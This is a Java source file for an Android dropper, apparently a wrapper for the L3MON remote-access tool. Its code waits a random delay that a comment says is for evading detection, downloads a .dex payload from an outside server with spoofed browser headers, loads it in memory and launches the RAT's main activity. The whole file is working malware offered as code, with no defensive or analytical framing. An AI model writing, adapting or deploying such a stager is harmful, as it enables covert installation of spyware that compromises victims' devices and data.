package com.etechd.l3mon.wrapper;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import dalvik.system.DexClassLoader;
import dalvik.system.InMemoryDexClassLoader;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.Random;

import com.etechd.l3mon.R;

public class DropperWrapper extends Activity {
    private static final String TAG = "L3MON_Wrapper";
    private static final String PAYLOAD_URL = "https://l3mon-server.com/payload.dex";
    private static final int DELAY_MS = 5000 + new Random().nextInt(5000);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_wrapper);

        // Delay para evitar detecção
        new Handler(Looper.getMainLooper()).postDelayed(this::startPayloadLoader, DELAY_MS);
    }

    private void startPayloadLoader() {
        try {
            byte[] payloadData = downloadPayload();
            if (payloadData == null) return;

            // Carregar payload em memória
            loadPayload(payloadData);

        } catch (Exception e) {
            Log.e(TAG, "Erro no carregamento", e);
        }
    }

    private byte[] downloadPayload() {
        try {
            URL url = new URL(PAYLOAD_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();

            // Headers falsos
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setRequestProperty("Accept", "*/*");

            conn.connect();

            if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                InputStream is = conn.getInputStream();
                ByteArrayOutputStream os = new ByteArrayOutputStream();

                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = is.read(buffer)) != -1) {
                    os.write(buffer, 0, bytesRead);
                }

                return os.toByteArray();
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao baixar payload", e);
        }
        return null;
    }

    private void loadPayload(byte[] data) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                // Carregar em memória
                ByteBuffer buffer = ByteBuffer.wrap(data);
                InMemoryDexClassLoader loader = new InMemoryDexClassLoader(buffer, getClassLoader());

                // Carregar classe principal do L3MON
                Class<?> mainClass = loader.loadClass("com.etechd.l3mon.MainActivity");
                Intent intent = new Intent(this, mainClass);
                startActivity(intent);

            } catch (Exception e) {
                Log.e(TAG, "Erro ao carregar payload", e);
            }
        }
    }
}